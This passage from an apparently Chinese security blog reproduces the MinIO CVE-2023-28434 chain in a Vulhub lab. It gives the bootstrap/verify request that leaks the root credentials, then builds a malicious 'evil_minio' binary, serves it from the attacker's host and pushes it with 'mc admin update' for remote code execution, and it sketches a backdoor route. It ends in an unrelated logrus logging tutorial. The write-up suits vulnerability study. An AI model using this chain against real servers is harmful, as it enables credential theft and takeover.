MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - --console-address<br>      - :<span class="hljs-number">9001</span><br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    ports:<br>      - <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span><br>      - <span class="hljs-number">9001</span>:<span class="hljs-number">9001</span><br>    hostname: node1<br>    volumes:<br>      - ./mnt/data1:/mnt/data1<br>  node2:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node2<br>    volumes:<br>      - ./mnt/data2:/mnt/data2<br>  node3:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node3<br>    volumes:<br>      - ./mnt/data3:/mnt/data3<br></code></pre></td></tr></table></figure><h1 id="1-未授权访问："><a href="#1-未授权访问：" class="headerlink" title="1.未授权访问："></a>1.未授权访问：</h1><h2 id="1-1-登录信息泄露："><a href="#1-1-登录信息泄露：" class="headerlink" title="1.1 登录信息泄露："></a>1.1 登录信息泄露：</h2><p>minio中web页面访问是<code>ip:9001</code>，而api服务访问则是<code>ip:9000</code></p><p>使用burp抓包，poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/minio/bootstrap/v1/verify</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9000<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure><p>或者使用curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST \<br>  http://10.10.10.129:9000/minio/bootstrap/v1/verify \<br>  -H <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept: */*&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept-Language: en-US;q=0.9,en;q=0.8&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Connection: close&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Cache-Control: max-age=0&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Length: 0&#x27;</span><br></code></pre></td></tr></table></figure><p>可以查看到相关信息：</p><p><img src="/./../blog_image/image-20231226215840140.png" alt="image-20231226215840140"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;MinioEndpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Legacy&quot;</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;SetCount&quot;</span>:<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;DrivesPerSet&quot;</span>:<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Endpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node1:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:true</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node2:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node3:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;CmdLine&quot;</span>:<span class="hljs-string">&quot;http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Platform&quot;</span>:<span class="hljs-string">&quot;OS: linux | Arch: amd64&quot;</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MinioEnv&quot;</span>:&#123;<span class="hljs-string">&quot;MINIO_ACCESS_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_CONFIG_ENV_FILE&quot;</span>:<span class="hljs-string">&quot;config.env&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_KMS_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;kms_master_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>:<span class="hljs-string">&quot;minioadmin-vulhub&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>:<span class="hljs-string">&quot;minioadmin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>可以查看<code>MINIO_ROOT_PASSWOR</code>和<code>MINIO_ROOT_USER</code></p><p>登陆成功。</p><p><img src="/./../blog_image/image-20231226215859605.png" alt="image-20231226215859605"></p><h2 id="1-2-连接minio客户端："><a href="#1-2-连接minio客户端：" class="headerlink" title="1.2 连接minio客户端："></a>1.2 连接minio客户端：</h2><p>为了更好的管理minio，官方提供了mc工具，通过输入账号和密码即可连接成功。</p><p>安装mc指令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://dl.min.io/client/mc/release/linux-amd64/mc \<br>  --create-dirs \<br>  -o <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/minio-binaries/<br></code></pre></td></tr></table></figure><p><strong>添加实例：</strong></p><p>使用命令<code>mc config host add miniode1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub</code>进行连接，后面传入的分别是账号和密码。</p><p><img src="/./../blog_image/image-20231226215906800.png" alt="image-20231226215906800"></p><p>这里留个坑，不会使用cyberduck连接上minio。</p><p><img src="/./../blog_image/image-20231226215911642.png" alt="image-20231226215911642"></p><h1 id="2-RCE-复现"><a href="#2-RCE-复现" class="headerlink" title="2.RCE 复现"></a>2.RCE 复现</h1><h2 id="2-1-配置mc指令："><a href="#2-1-配置mc指令：" class="headerlink" title="2.1 配置mc指令："></a>2.1 配置mc指令：</h2><p>上面所述，minio的mc(minio的客户端)可以远程升级minio服务器，而关键在于升级地址是一个可以通过预自定义的。</p><p>可以从下面的连接进行下载源代码。</p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p>查看官方文档，查看使用<code>mc admin</code>的使用：**<a href="https://min.io/docs/minio/linux/reference/minio-mc-admin.html">MinIO Admin Client — MinIO Object Storage for Linux</a>**</p><p><img src="/./../blog_image/image-20231226215918047.png" alt="image-20231226215918047"></p><h2 id="2-2-update实现rce"><a href="#2-2-update实现rce" class="headerlink" title="2.2 update实现rce:"></a>2.2 update实现rce:</h2><p>拉取大佬修改好的minio(其实是懒得找源码，自己修改)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AbelChe/evil_minio.git<br>go env -w GOPROXY=https://goproxy.cn,direct // 设置代理<br>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=&quot;-s -w&quot; -trimpath //编译<br>//重命名<br>mv minio minio.RELEASE.2023-03-22T06-36-24Z<br>//shasum校验<br>shasum -a 256 minio.RELEASE.2023-03-22T06-36-24Z &gt; minio.RELEASE.2023-03-22T06-36-24Z.sha256sum<br>启动http服务<br>python3 -m http.server 18090<br></code></pre></td></tr></table></figure><p>然后我们可以创建一个桶，直观看到变化：</p><p>接着我们执行更新操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">添加 MinIO服务案例</span><br>mc config host add docker_minio1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span>命令 - 列出对象(可以不执行这一步)</span><br>mc ls miniode1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载更新包更新</span><br>mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.sha256sum -y<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231226215932676.png" alt="image-20231226215932676"></p><p>最终效果如图所示：</p><p><img src="/./../blog_image/image-20231226215937704.png" alt="image-20231226215937704"></p><p><img src="/./../blog_image/image-20231226215942747.png" alt="image-20231226215942747"></p><p>成功更新并且实现了rce。</p><h1 id="3-漏洞原理重现："><a href="#3-漏洞原理重现：" class="headerlink" title="3.漏洞原理重现："></a>3.漏洞原理重现：</h1><h2 id="3-1-代码审计："><a href="#3-1-代码审计：" class="headerlink" title="3.1 代码审计："></a>3.1 代码审计：</h2><h3 id="信息泄露从何而来？"><a href="#信息泄露从何而来？" class="headerlink" title="信息泄露从何而来？"></a>信息泄露从何而来？</h3><p>在<code>cmd/routers.go</code>中<code>configureServerHandler</code>是注册路由方法，如图所示：</p><p><img src="/./../blog_image/image-20231226215947872.png" alt="image-20231226215947872"></p><p>其中根据漏洞报告可以知道，信息泄露的相关api是<code>bootStrap</code>相关的。</p><p>因此初步推断是<code>registerDistErasureRouters</code>中注册<code>bootStrap</code>相关的路由，如图所示：</p><p><img src="/./../blog_image/image-20231226215952177.png" alt="image-20231226215952177"></p><p>接着查看<code>registerBootStrapRESTHandlers</code>可以看到<code>verify</code>路由。</p><p><img src="/./../blog_image/image-20231226215959798.png" alt="image-20231226215959798"></p><p>查看<code>server.HealthHandler</code>函数：</p><p><img src="/./../blog_image/image-20231226220004077.png" alt="image-20231226220004077"></p><p>可以看到存在敏感信息，即<code>getServerSystemCfg</code>函数，点击后查看该函数返回的值是<code>ServerSystemConfig</code>结构体，这个结构体中包含了环境变量<code>MINIO_</code>的相关敏感信息：</p><p><img src="/./../blog_image/image-20231226220008853.png" alt="image-20231226220008853"></p><p>获取了环境变量后用了for循环对<code>envValues</code>这个map赋值，而这个<code>skipEnvs</code>就是罪大恶极的map，里面包含了账号密码等敏感信息。</p><p><img src="/./../blog_image/image-20231226220014606.png" alt="image-20231226220014606"></p><p>所以这个<code>skipEnvs[envK]</code>是什么呢？根据官方说明，MinIO在启动时会从环境变量中读取预先设置的用户和密码，默认情况下：minioadmin&#x2F;minioadmin。就是说如果环境变量存在，则不对其赋值，如果不存在则会抛到上一层，最终判断为空则会使用默认账号密码。</p><h3 id="更新RCE从何而来？"><a href="#更新RCE从何而来？" class="headerlink" title="更新RCE从何而来？"></a>更新RCE从何而来？</h3><p>可以查看<code>cmd/update.go</code>，其中全局变量已经设置到了相关的更新路径，如图所示：</p><p><img src="/./../blog_image/image-20231226220018632.png" alt="image-20231226220018632"></p><p>minio在更新的时候会对更新包进行sha256sum，但由于<code>envMinisignPubKey</code>为空，所以校验无效了：</p><p><img src="/./../blog_image/image-20231226220022081.png" alt="image-20231226220022081"></p><h2 id="3-2-无损RCR-后门："><a href="#3-2-无损RCR-后门：" class="headerlink" title="3.2 无损RCR+后门："></a>3.2 无损RCR+后门：</h2><p>如何编写一个路由呢？</p><p>在<code>cmd/routers.go</code>中的<code>globalHandler</code>添加自己的router,如图所示：</p><p><img src="/./../blog_image/image-20231226220026088.png" alt="image-20231226220026088"></p><p>在<code>generic-handlers.go</code>中添加<code>handler</code></p><p><img src="/./../blog_image/image-20231226220030207.png" alt="image-20231226220030207"></p><p>创建一个函数判断当前系统是window还是linux，如图所示：</p><p><img src="/./../blog_image/image-20231226220034525.png" alt="image-20231226220034525"></p><p>参考文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p><p><a href="https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html">mc admin update — MinIO Object Storage for Linux</a></p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>minio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logrus实现日志推送</title>
    <link href="/2023/12/08/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/"/>
    <url>/2023/12/08/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="1-logrus介绍："><a href="#1-logrus介绍：" class="headerlink" title="1.logrus介绍："></a>1.logrus介绍：</h1><p>导入包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go get -u github.com/sirupsen/logrus<br></code></pre></td></tr></table></figure><h2 id="1-1-logrus基础配置："><a href="#1-1-logrus基础配置：" class="headerlink" title="1.1 logrus基础配置："></a>1.1 logrus基础配置：</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> LogrusObj *logrus.Logger<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitLog</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">if</span> LogrusObj != <span class="hljs-literal">nil</span> &#123;<br>       file, err := setOutputFile()<br>       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>          <span class="hljs-built_in">panic</span>(err)<br>       &#125;<br>       LogrusObj.SetOutput(file)<br>       <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 初始化</span><br>    logger := logrus.New()<br>    file, err := setOutputFile()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br>    logger.SetOutput(file)<br>    logger.SetLevel(logrus.DebugLevel)<br>    logger.SetFormatter(&amp;logrus.JSONFormatter&#123;<br>       TimestampFormat: <span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>,<br>    &#125;)<br>    LogrusObj = logger<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setOutputFile</code>函数是设置日志输出的位置，这里的<code>setOutputFile</code>函数如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// setOutputFile 按照日期进行分割，如果不存在则创建，存在就写入日至中</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setOutputFile</span><span class="hljs-params">()</span></span> (*os.File, <span class="hljs-type">error</span>) &#123;<br>    now := time.Now()<br>    dir, err := os.Getwd()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br>    <span class="hljs-comment">// 设置日志文件位置</span><br>    logFilePath := filepath.Join(dir, <span class="hljs-string">&quot;/logs/&quot;</span>)<br><br>    <span class="hljs-comment">// 使用os.Stat 判断文件或文件夹是否存在</span><br>    <span class="hljs-comment">// 如果返回 err是nil则表明文件或文件夹存在</span><br>    <span class="hljs-comment">// 否则使用os.IsNotExists() 判断 ==》 如果为true则表明文件或文件夹不存在</span><br>    _, err = os.Stat(logFilePath)<br>    <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>       <span class="hljs-comment">// true 文件夹或文件不存在</span><br>       <span class="hljs-keyword">if</span> err = os.MkdirAll(logFilePath, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br>          log.Fatal(err)<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>       &#125;<br>    &#125;<br>    <span class="hljs-comment">// 文件夹存在</span><br>    logFileName := now.Format(FileNameLayOut) + <span class="hljs-string">&quot;.log&quot;</span><br>    fileName := filepath.Join(logFilePath, logFileName)<br><br>    <span class="hljs-comment">// err不为空 则需要使用os.IsNotExists()判断文件是否存在</span><br>    <span class="hljs-keyword">if</span> _, err = os.Stat(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>          <span class="hljs-comment">// 创建文件</span><br>          <span class="hljs-keyword">if</span> _, err = os.Create(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>             log.Fatal(err)<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>          &#125;<br>       &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 写入文件</span><br>    <span class="hljs-comment">// O_WRONLY 以只写的方式</span><br>    <span class="hljs-comment">// O_APPEND 追加</span><br>    <span class="hljs-comment">// ModeAppend 只能写 且只能写到末尾</span><br>    file, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY, os.ModeAppend)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> file, err<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑有以下：</p><ul><li>获取项目的位置</li><li>使用<code>filepath.Join</code>将文件地址后加上<code>log</code></li><li>使用<code>os.Stat</code>用于判断文件或文件夹是否存在，如果返回err是nil表明存在，如果不为nil则需要使用<code>os.IsNotExists()</code>，如果返回true表明文件或文件夹不存在</li><li>文件夹不存在则创建，使用<code>os.MkdirAll(路径，权限)</code>。</li><li>文件夹存在，则可以组装日志文件的文件名，然后通过这个文件名去判断当前文件是否存在，如果不存在则创建。</li><li>如果文件存在则可以直接进行追加，需要注意这里需要提供flag。<code> os.O_APPEND|os.O_WRONLY, os.ModeAppend</code>分别表示以只写的方式，追加的方式，后面的<code>os.ModeAppend</code>表示给写的权限并且只能写道末尾。</li></ul><p>效果如图</p><p><img src="/./../blog_image/image-20231208133115437.png" alt="image-20231208133115437"></p><h2 id="1-2-logrus的其他配置："><a href="#1-2-logrus的其他配置：" class="headerlink" title="1.2 logrus的其他配置："></a>1.2 logrus的其他配置：</h2><p>logrus可以使用<code>WithFields</code>添加自己的一个字段，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">logger := logrus.New()<br>logger.SetLevel(logrus.DebugLevel)<br>entry := logger.WithFields(logrus.Fields&#123;<br>    <span class="hljs-string">&quot;作者&quot;</span>: <span class="hljs-string">&quot;cz&quot;</span>,<br>&#125;)<br><br>entry.Info(<span class="hljs-string">&quot;nihao&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231208133129801.png" alt="image-20231208133129801"></p><p>可以使用<code>entry.Data</code>返回的是一个<code>map[string]interface&#123;&#125;</code>就是刚才设置<code>WithFields</code>的值。</p><h2 id="1-3-logrus的hook："><a href="#1-3-logrus的hook：" class="headerlink" title="1.3 logrus的hook："></a>1.3 logrus的hook：</h2><p>只需要实现<code>hook</code>这个接口，就可以了。</p><p>logrus调用中添加<code>AddHook(hook)</code>即可。</p><p>logrus的hook接口需要实现两个方法，如下：</p><p><img src="/./../blog_image/image-20231208133142522.png" alt="image-20231208133142522"></p><p>其中<code>Levels</code>方法是返回什么日志级别才会触发hook的，而<code>Fire</code>则是具体实现hook的逻辑。</p><h1 id="2-配置Es"><a href="#2-配置Es" class="headerlink" title="2.配置Es"></a>2.配置Es</h1><p>引用库：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">github.com/elastic/<span class="hljs-keyword">go</span>-elasticsearch<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs GO"><span class="hljs-keyword">var</span> 